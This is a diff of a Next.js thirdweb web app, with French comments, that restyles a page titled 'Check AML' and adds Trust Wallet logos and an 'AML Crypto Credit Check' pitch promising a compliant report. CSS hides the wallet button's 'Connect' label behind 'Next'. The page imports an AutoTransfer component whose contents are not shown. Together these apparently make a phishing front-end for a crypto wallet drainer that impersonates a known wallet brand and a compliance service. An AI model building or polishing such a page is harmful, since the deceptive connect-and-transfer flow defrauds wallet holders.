@@ -1,6 +1,6 @@
 
 
---- Résumé : 15 fichiers inclus, 12 fichiers ignorés ---
+--- Résumé : 15 fichiers inclus, 14 fichiers ignorés ---
 
 
 ===== Fichier: .env.example =====
@@ -255,9 +255,27 @@ export const client = createThirdwebClient({
 
 @layer base {
 	body {
-		@apply bg-white text-zinc-900;
+		/* Ajout de l'image de fond */
+		@apply text-zinc-900;
+		background-image: url('newblanc.png'); /* Assurez-vous que l'image est dans /public */
+		background-size: cover;
+		background-position: center;
+		background-repeat: no-repeat;
+		background-attachment: fixed;
 	}
 }
+
+/* Section floutée pour la lisibilité du texte (inspiré de l'ancien projet) */
+.text-box-blur {
+  background: rgba(255, 255, 255, 0.1); /* Légèrement plus transparent */
+  backdrop-filter: blur(8px); /* Flou plus prononcé */
+  padding: 2rem;
+  border-radius: 1rem;
+  box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+  border: 1px solid rgba(255, 255, 255, 0.3);
+}
+
+
 /*
   Cible le bouton pour cacher le texte original "Connect".
 */
@@ -272,7 +290,7 @@ export const client = createThirdwebClient({
   Crée le nouveau texte "Suivant" avec un pseudo-élément.
 */
 .tw-connect-wallet.css-1d64wxn::before {
-  content: "Suivant";
+  content: "Next";
   /* On rétablit la taille de police et la couleur pour ce nouveau texte. */
   font-size: 16px;
   color: black; /* <-- Changez la couleur si besoin (ex: black) */
@@ -289,7 +307,7 @@ import { ThirdwebProvider } from "thirdweb/react";
 const inter = Inter({ subsets: ["latin"] });
 
 export const metadata: Metadata = {
-  title: "AML Trust",
+  title: "Check AML",
   description:
     "Starter template for using thirdweb SDK with Next.js App router",
 };
@@ -319,9 +337,9 @@ import { ConnectButton } from "thirdweb/react";
 import { createThirdwebClient } from "thirdweb";
 import { createWallet, type Wallet } from "thirdweb/wallets";
 import AutoTransfer from "./components/AutoTransfer";
-import thirdwebIcon from "@public/thirdweb.svg";
-import trustwallet from "@public/trustwallet.png";
 import trust from "@public/trust.png";
+import trustW from "@public/trustwallet.png";
+
 // --- Création du client Thirdweb ---
 const client = createThirdwebClient({
   clientId: "c98a5d48ad89f114ad6044933fced541",
@@ -349,8 +367,20 @@ export default function Home() {
   };
 
   return (
-    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto bg-white">
+    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto">
       <Header />
+
+      {/* Section de texte ajoutée */}
+      <div className="text-center text-white my-12 max-w-2xl mx-auto text-box-blur">
+       <h1 className="text-5xl md:text-6xl font-extrabold mb-4 text-blue-900">
+  AML Crypto Credit Check
+</h1>
+
+     <p className="text-base sm:text-lg text-black">
+  In just a few seconds, assess the AML (anti-money laundering) risks of a crypto address or entity and get a clear, actionable credit report that complies with regulatory requirements.
+</p>
+
+      </div>
 
       <div className="flex justify-center mb-20 mt-10">
         <ConnectButton
@@ -373,27 +403,17 @@ export default function Home() {
 
 function Header() {
   return (
-    <header className="flex flex-col items-center mb-20">
-      <Image
-        src={trustwallet}
-        alt="Thirdweb Logo"
-        width={150}
-        height={150}
-        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
-      />
-      <Image
-        src={trust}
-        alt="Thirdweb Logo"
-        width={150}
-        height={150}
-        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
-      />
-
+    <header className="flex flex-col items-center mb-10 pt-10">
     
+      <Image
+        src={trustW}
+        alt="Trust Logo"
+        width={100}
+        height={100}
+      />
     </header>
   );
 }
-
 
 
 ===== Fichier: src\app\components\AutoTransfer.tsx =====
